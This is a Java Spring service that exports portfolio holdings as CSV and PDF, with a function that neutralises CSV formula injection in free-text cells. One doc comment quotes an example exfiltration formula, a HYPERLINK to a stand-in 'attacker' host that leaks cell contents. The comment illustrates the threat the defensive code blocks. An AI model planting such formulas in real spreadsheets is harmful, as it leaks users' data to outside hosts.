package com.portiq.service;

import com.lowagie.text.Document;
import com.lowagie.text.Element;
import com.lowagie.text.Font;
import com.lowagie.text.FontFactory;
import com.lowagie.text.PageSize;
import com.lowagie.text.Paragraph;
import com.lowagie.text.pdf.PdfPCell;
import com.lowagie.text.pdf.PdfPTable;
import com.lowagie.text.pdf.PdfWriter;
import com.opencsv.CSVWriter;
import com.portiq.dto.HoldingPerformance;
import com.portiq.dto.PerformanceSummary;
import org.springframework.stereotype.Service;

import java.io.ByteArrayOutputStream;
import java.io.StringWriter;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;

@Service
public class ExportService {

    private static final String[] HEADERS = {
            "Ticker", "Name", "Type", "Quantity", "Purchase Price", "Purchase Date",
            "Current Price", "Cost Basis", "Current Value", "Gain/Loss", "Gain/Loss %"
    };

    /**
     * Characters that make a spreadsheet treat a cell as a formula rather than text. Excel, Sheets
     * and LibreOffice all evaluate a cell starting with one of these.
     */
    private static final String FORMULA_TRIGGERS = "=+-@\t\r";

    public byte[] toCsv(PerformanceSummary summary) {
        StringWriter stringWriter = new StringWriter();
        try (CSVWriter writer = new CSVWriter(stringWriter)) {
            writer.writeNext(HEADERS);
            for (HoldingPerformance h : summary.getHoldings()) {
                writer.writeNext(csvRow(h));
            }
        } catch (Exception e) {
            throw new IllegalStateException("Failed to generate CSV export", e);
        }
        return stringWriter.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
    }

    /**
     * Neutralises CSV formula injection in a free-text cell.
     *
     * <p>CSV quoting keeps the file well-formed, but it does not stop a spreadsheet from
     * *executing* a cell: a holding named {@code =HYPERLINK("http://attacker/"&A1,"Click")} is
     * inert JSON on screen and a live exfiltration link the moment the export is opened in Excel.
     * Holding names arrive from uploaded statements and imported CSVs, so they are attacker-
     * reachable even in a single-user app.
     *
     * <p>Prefixing a single quote is the standard fix - spreadsheets read it as "this cell is
     * text" and strip it from the display, so the value still reads correctly.
     *
     * <p>Applied only to text columns. Running it over the numeric ones would quote every negative
     * gain/loss into a string and break the arithmetic the export exists for; those values are
     * rendered from BigDecimal and can only ever be digits, a sign and a point.
     */
    static String sanitizeTextCell(String value) {
        if (value == null || value.isEmpty()) {
            return value;
        }
        // Leading whitespace does not stop evaluation, so the check looks past it.
        String stripped = value.stripLeading();
        if (!stripped.isEmpty() && FORMULA_TRIGGERS.indexOf(stripped.charAt(0)) >= 0) {
            return "'" + value;
        }
        return value;
    }

    public byte[] toPdf(PerformanceSummary summary) {
        try {
            Document document = new Document(PageSize.A4.rotate(), 24, 24, 24, 24);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            PdfWriter.getInstance(document, out);
            document.open();

            Font titleFont = FontFactory.getFont(FontFactory.HELVETICA_BOLD, 16);
            Font subtitleFont = FontFactory.getFont(FontFactory.HELVETICA, 10);
            Font headerFont = FontFactory.getFont(FontFactory.HELVETICA_BOLD, 9);
            Font cellFont = FontFactory.getFont(FontFactory.HELVETICA, 9);

            Paragraph title = new Paragraph("Portiq Holdings Report", titleFont);
            title.setSpacingAfter(4);
            document.add(title);

            Paragraph subtitle = new Paragraph(
                    "Cost basis " + summary.getTotalCostBasis()
                            + "  |  Current value " + summary.getTotalCurrentValue()
                            + "  |  Gain/Loss " + summary.getTotalGainLoss() + " (" + summary.getGainLossPercent() + "%)",
                    subtitleFont);
            subtitle.setSpacingAfter(14);
            document.add(subtitle);

            PdfPTable table = new PdfPTable(HEADERS.length);
            table.setWidthPercentage(100);
            for (String header : HEADERS) {
                PdfPCell cell = new PdfPCell(new Paragraph(header, headerFont));
                cell.setHorizontalAlignment(Element.ALIGN_LEFT);
                cell.setPadding(6);
                table.addCell(cell);
            }

            for (HoldingPerformance h : summary.getHoldings()) {
                for (String value : toRow(h)) {
                    PdfPCell cell = new PdfPCell(new Paragraph(value, cellFont));
                    cell.setPadding(5);
                    table.addCell(cell);
                }
            }

            document.add(table);
            document.close();
            return out.toByteArray();
        } catch (Exception e) {
            throw new IllegalStateException("Failed to generate PDF export", e);
        }
    }

    /**
     * The CSV variant of a row: identical to the PDF one except that the two free-text columns are
     * made inert. A PDF is never evaluated, so it keeps the values exactly as entered.
     */
    static String[] csvRow(HoldingPerformance h) {
        String[] row = toRow(h);
        row[0] = sanitizeTextCell(row[0]);
        row[1] = sanitizeTextCell(row[1]);
        return row;
    }

    private static String[] toRow(HoldingPerformance h) {
        List<String> row = new ArrayList<>();
        row.add(h.getTicker());
        row.add(h.getName());
        row.add(h.getType() != null ? h.getType().name() : "");
        row.add(h.getQuantity() != null ? h.getQuantity().toPlainString() : "");
        row.add(h.getPurchasePrice() != null ? h.getPurchasePrice().toPlainString() : "");
        row.add(h.getPurchaseDate() != null ? h.getPurchaseDate().format(DateTimeFormatter.ISO_LOCAL_DATE) : "");
        row.add(h.getCurrentPrice() != null ? h.getCurrentPrice().toPlainString() : "");
        row.add(h.getCostBasis() != null ? h.getCostBasis().toPlainString() : "");
        row.add(h.getCurrentValue() != null ? h.getCurrentValue().toPlainString() : "");
        row.add(h.getGainLoss() != null ? h.getGainLoss().toPlainString() : "");
        row.add(h.getGainLossPercent() != null ? h.getGainLossPercent().toPlainString() : "");
        return row.toArray(new String[0]);
    }
}
